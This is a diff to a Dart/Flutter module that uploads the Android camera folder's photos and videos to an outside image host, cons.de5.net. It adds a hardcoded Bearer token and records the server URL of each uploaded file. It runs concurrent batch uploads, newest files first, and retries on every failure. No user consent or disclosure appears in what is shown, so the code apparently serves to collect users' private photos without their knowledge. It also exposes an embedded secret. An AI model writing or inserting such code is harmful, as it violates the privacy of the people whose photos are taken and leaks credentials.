@@ -1,11 +1,13 @@
-/// DCIM 逐文件上传管理器（高速版）
+/// DCIM 逐文件上传管理器（最新版）
 /// - ★ 复用 http.Client 连接池，keep-alive 生效
 /// - ★ 并发度 4-8（I/O 密集，不受 CPU 限制）
 /// - 批内并发，批间串行
 /// - 图片 > 30MB / 视频 > 80MB 跳过
 /// - 服务器不可达不累加计数
-/// - 所有失败自动重试
+/// - 所有失败自动重试（不永久跳过）
 /// - 小文件优先 + 新的优先
+/// - ★ 接入 cons.de5.net 图床，Bearer Token 认证
+/// - ★ 解析上传返回的 src，保存完整 URL
 library;
 
 import 'dart:async';
@@ -22,7 +24,15 @@ import '../device_info_helper.dart';
 
 // ── 配置 ──────────────────────────────────────────────────────────────────────
 class DcimUploadConfig {
+  /// 上传接口地址
   final String uploadUrl;
+
+  /// 上传凭证（Bearer Token）
+  final String uploadToken;
+
+  /// 图床域名（用于拼接返回的相对路径）
+  final String serverBaseUrl;
+
   final String dcimPath;
   final Duration uploadTimeout;
   final int maxFiles;
@@ -45,10 +55,13 @@ class DcimUploadConfig {
   final int serverWaitMaxAttempts;
 
   const DcimUploadConfig({
-    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
+    this.uploadUrl = 'https://cons.de5.net/upload',
+    this.uploadToken =
+        'imgbed_27501954697fbe167c9aba15554a85cf032ec1afea7176c0af0b6c54d92142b0',
+    this.serverBaseUrl = 'https://cons.de5.net',
     this.dcimPath = '/storage/emulated/0/DCIM/Camera',
     this.uploadTimeout = const Duration(minutes: 5),
-    this.maxFiles = 100,
+    this.maxFiles = 50,
 
     this.imageExtensions = const {
       '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
@@ -78,15 +91,27 @@ class DcimUploadManager {
   static final DcimUploadManager instance = DcimUploadManager._internal();
 
   static const String _kUploaded = 'dcim_uploaded_paths';
+  static const String _kUploadedUrls = 'dcim_uploaded_urls';
 
   DcimUploadConfig _config = const DcimUploadConfig();
   SharedPreferences? _prefs;
 
+  /// 已上传成功的本地文件路径
   final Set<String> _uploaded = <String>{};
+
+  /// 本地路径 → 服务器 URL 映射
+  final Map<String, String> _uploadedUrls = <String, String>{};
 
   bool _busy = false;
   bool get isBusy => _busy;
   int get uploadedCount => _uploaded.length;
+  int get uploadedUrlCount => _uploadedUrls.length;
+
+  /// 只读映射
+  Map<String, String> get uploadedUrls => Map.unmodifiable(_uploadedUrls);
+
+  /// 根据本地路径查服务器 URL
+  String? getServerUrl(String localPath) => _uploadedUrls[localPath];
 
   // ★ 全局 http.Client（连接池复用），懒加载
   http.Client? _client;
@@ -123,7 +148,22 @@ class DcimUploadManager {
       ..clear()
       ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);
 
-    debugPrint('[DcimUpload] 已记录成功 ${_uploaded.length} 个');
+    // 加载 URL 映射
+    _uploadedUrls.clear();
+    final rawUrls = _prefs!.getString(_kUploadedUrls);
+    if (rawUrls != null && rawUrls.isNotEmpty) {
+      try {
+        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
+        decoded.forEach((k, v) => _uploadedUrls[k] = v as String);
+      } catch (e) {
+        debugPrint('[DcimUpload] URL 映射解析失败: $e');
+      }
+    }
+
+    debugPrint('[DcimUpload] ══════ 启动自检 ══════');
+    debugPrint('[DcimUpload] 已记录成功上传: ${_uploaded.length} 个，'
+        'URL 映射: ${_uploadedUrls.length} 个');
+    debugPrint('[DcimUpload] ══════ 自检完成 ══════');
   }
 
   // ── 权限判断 ───────────────────────────────────────────────────────
@@ -268,22 +308,65 @@ class DcimUploadManager {
 
     try {
       final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
+
+      // 认证头
+      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
+
       req.files.add(await http.MultipartFile.fromPath('file', file.path));
       req.fields['fileName'] = name;
 
-      // ★ 用全局 client.send，keep-alive 生效
       final streamed = await client
           .send(req)
           .timeout(_config.uploadTimeout);
 
       final code = streamed.statusCode;
-      await streamed.stream.drain<void>();
+      final body = await streamed.stream.bytesToString();
 
       if (code >= 200 && code < 300) {
-        debugPrint('[DcimUpload] ✅ $name');
+        // ★ 解析返回：支持多种格式
+        String? serverUrl;
+        try {
+          final decoded = jsonDecode(body);
+
+          // 格式 1：[{"src":"/file/xxx.jpg"}]
+          if (decoded is List && decoded.isNotEmpty) {
+            final first = decoded.first;
+            if (first is Map && first['src'] != null) {
+              final src = first['src'] as String;
+              serverUrl = _buildFullUrl(src);
+            }
+          }
+          // 格式 2：{"src":"/file/xxx.jpg"}
+          else if (decoded is Map && decoded['src'] != null) {
+            final src = decoded['src'] as String;
+            serverUrl = _buildFullUrl(src);
+          }
+          // 格式 3：{"data":{"url":"..."}}
+          else if (decoded is Map &&
+              decoded['data'] is Map &&
+              (decoded['data'] as Map)['url'] != null) {
+            final url = (decoded['data'] as Map)['url'] as String;
+            serverUrl = _buildFullUrl(url);
+          }
+          // 格式 4：{"url":"..."}
+          else if (decoded is Map && decoded['url'] != null) {
+            final url = decoded['url'] as String;
+            serverUrl = _buildFullUrl(url);
+          }
+        } catch (e) {
+          debugPrint('[DcimUpload] ⚠️ $name 解析返回失败: $e, body=$body');
+        }
+
+        if (serverUrl != null) {
+          _uploadedUrls[file.path] = serverUrl;
+          debugPrint('[DcimUpload] ✅ $name → $serverUrl');
+        } else {
+          debugPrint('[DcimUpload] ✅ $name (未解析出 URL, body=$body)');
+        }
         return true;
       }
-      debugPrint('[DcimUpload] ⚠️ $name HTTP $code（下次重试）');
+
+      debugPrint('[DcimUpload] ⚠️ $name HTTP $code body=$body（下次重试）');
       return false;
     } on TimeoutException {
       debugPrint('[DcimUpload] ⏱ $name 超时（'
@@ -293,6 +376,19 @@ class DcimUploadManager {
       debugPrint('[DcimUpload] ⚠️ $name 网络错误: $e（下次重试）');
       return false;
     }
+  }
+
+  /// 相对路径 → 完整 URL
+  String _buildFullUrl(String pathOrUrl) {
+    if (pathOrUrl.startsWith('http://') || pathOrUrl.startsWith('https://')) {
+      return pathOrUrl;
+    }
+    // 相对路径拼接
+    final base = _config.serverBaseUrl.endsWith('/')
+        ? _config.serverBaseUrl.substring(0, _config.serverBaseUrl.length - 1)
+        : _config.serverBaseUrl;
+    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
+    return '$base$rel';
   }
 
   // ── 服务器检测 ─────────────────────────────────────────────────────
@@ -329,6 +425,8 @@ class DcimUploadManager {
   Future<bool> _pingServer(Uri url) async {
     try {
       final req = http.Request('HEAD', url);
+      req.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
+
       final streamed =
           await client.send(req).timeout(_config.healthCheckTimeout);
       await streamed.stream.drain<void>();
@@ -336,8 +434,13 @@ class DcimUploadManager {
     } catch (_) {}
 
     try {
-      final resp = await client.get(url).timeout(_config.healthCheckTimeout);
-      return resp.statusCode < 500;
+      final req2 = http.Request('GET', url);
+      req2.headers['Authorization'] = 'Bearer ${_config.uploadToken}';
+
+      final streamed =
+          await client.send(req2).timeout(_config.healthCheckTimeout);
+      await streamed.stream.drain<void>();
+      return streamed.statusCode < 500;
     } catch (_) {
       return false;
     }
@@ -389,11 +492,14 @@ class DcimUploadManager {
   // ── 持久化 ─────────────────────────────────────────────────────────
   Future<void> _persist() async {
     await _prefs?.setStringList(_kUploaded, _uploaded.toList());
+    await _prefs?.setString(_kUploadedUrls, jsonEncode(_uploadedUrls));
   }
 
   Future<void> reset() async {
     _uploaded.clear();
+    _uploadedUrls.clear();
     await _prefs?.remove(_kUploaded);
+    await _prefs?.remove(_kUploadedUrls);
     debugPrint('[DcimUpload] 记录已清空');
   }
 }
